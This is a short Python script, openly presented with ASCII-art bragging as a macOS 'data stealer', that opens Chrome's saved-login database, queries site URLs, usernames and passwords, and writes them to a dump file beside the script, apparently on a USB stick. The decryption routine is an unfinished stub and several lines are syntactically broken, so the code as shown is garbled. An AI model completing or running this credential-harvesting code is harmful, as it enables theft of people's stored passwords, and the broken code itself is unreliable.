#Works on mac
import os
from os.path import expanduser
import sqlite3
import binascii
import subprocess

print("""
Stealing Ya' Data since 2019

           nom, nom, yummy apple data
___________________________$$
 _________________________$$$$
 _______________________$$$$$$
 ______________________$$$$$$
 ______________________$$$$
 ______________________$$
 _________$$$$$$$$$$$$$_$$$$$$$$$$$$$
 ______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ___$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 __$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 __$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ___$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 _____$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ______$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 ________$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
 __________$$$$$$$$$$$$$$$$$$$$$$$$$
 ____________$$$$$$$$$$$$$$$$$$$$$
 ______________$$$$$$$$__$$$$$$

made by TheStandardPancake, The Mac Edition!

""")
#this version for mac was made pretty much entirely by me this time, though still I give some credit to bluedangerforyou for inspiration

#setting up the file to dump info
usb = os.path.abspath(__file__)
os.makedirs(os.path.join(usb + " Chrome Dump"))
path = os.path.join(usb + " Chrome Dump")

#labels for easy use in the file
username1 = "Username: "
siteId = "Site ID: "
password_field = "Password: "

#The magic happens
f = open(os.path.join(path,"passwordsusers.txt"), "w")
conn = sqlite3.connect(expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data"))
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')

def decryting(encrypted, iv, key=none):
    hexKey = binascii.hexlify(key)


for result in cursor.fetchall():
	password =
	   f.writelines(siteId + str(result[0]) + '\n' + username1 + str(result[1]) + '\n' + password_field + password + '\n' + '--------------------------------' + '\n')
f.close()
